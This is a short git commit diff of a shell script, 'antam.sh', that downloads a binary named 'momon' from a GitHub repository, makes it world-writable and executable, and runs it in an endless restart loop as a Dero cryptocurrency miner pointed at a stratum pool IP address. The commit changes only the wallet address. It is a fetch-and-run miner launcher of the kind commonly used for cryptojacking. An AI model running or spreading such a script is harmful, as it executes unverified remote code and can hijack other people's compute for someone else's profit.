2f99e8f7c56fd4e4caabb114d03ff58bb3b2e499
renilo <88342640+renilo@users.noreply.github.com>
2022-11-11 05:30:37 +0700

    Update antam.sh

--- antam.sh
+++ antam.sh
@@ -2,6 +2,6 @@ wget https://github.com/renilo/kuuntul/raw/main/momon
 chmod 777 momon
 
 while :; do
-    ./momon -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.TESTING2 -r 148.113.136.140:4300 -p stratum -k -1;
+    ./momon -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.TESTING2 -r 148.113.136.140:4300 -p stratum -k -1;
     sleep 5;
 done
